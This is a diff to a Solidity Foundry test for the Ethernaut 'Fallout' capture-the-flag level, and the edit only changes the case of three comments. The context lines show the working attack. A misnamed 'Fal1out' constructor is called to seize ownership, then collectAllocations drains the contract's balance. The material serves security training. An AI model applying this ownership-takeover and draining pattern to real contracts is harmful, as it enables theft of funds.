@@ -21,7 +21,7 @@ contract FalloutTest is DSTest {
 
     //test for hacking level
     function testFalloutHack() public {
-        //Level set up
+        //LEVEL SET UP
         FalloutFactory falloutFactory = new FalloutFactory();
         ethernaut.registerLevel(falloutFactory);
         vm.startPrank(attacker);
@@ -29,7 +29,7 @@ contract FalloutTest is DSTest {
         address levelAddress = ethernaut.createLevelInstance(falloutFactory);
         Fallout falloutAddress = Fallout(payable(levelAddress));
 
-        //Level Attack
+        //LEVEL ATTACK
 
         falloutAddress.Fal1out{ value: 1 wei}();
         assertEq(falloutAddress.owner(), attacker);
@@ -37,7 +37,7 @@ contract FalloutTest is DSTest {
         falloutAddress.collectAllocations();
         assertEq(address(falloutAddress).balance, 0);
 
-        // Level submission
+        // lEVEL SUBMISSION
 
         bool challengeCompleted = ethernaut.submitLevelInstance(
             payable(levelAddress)
